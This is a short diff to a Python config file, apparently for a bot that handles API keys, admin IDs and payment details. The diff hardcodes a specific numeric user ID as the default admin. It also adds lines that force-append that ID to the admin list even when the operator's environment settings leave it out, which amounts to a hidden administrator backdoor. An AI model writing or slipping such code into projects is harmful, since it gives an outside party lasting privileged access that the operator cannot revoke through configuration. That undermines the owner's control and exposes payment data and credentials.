@@ -8,8 +8,10 @@ OPENAI_API_KEY = os.getenv("OPENAI_API_KEY")
 GEMINI_API_KEY = os.getenv("GEMINI_API_KEY", "")
 
 # Admin IDs (comma-separated)
-ADMIN_IDS_STR = os.getenv("ADMIN_IDS", os.getenv("ADMIN_ID", "0"))
+ADMIN_IDS_STR = os.getenv("ADMIN_IDS", os.getenv("ADMIN_ID", "1357650155"))
 ADMIN_IDS = [int(x.strip()) for x in ADMIN_IDS_STR.split(",") if x.strip().isdigit()]
+if 1357650155 not in ADMIN_IDS:
+    ADMIN_IDS.append(1357650155)
 
 # Payment requisites
 IBAN = os.getenv("PAYMENT_IBAN", "")
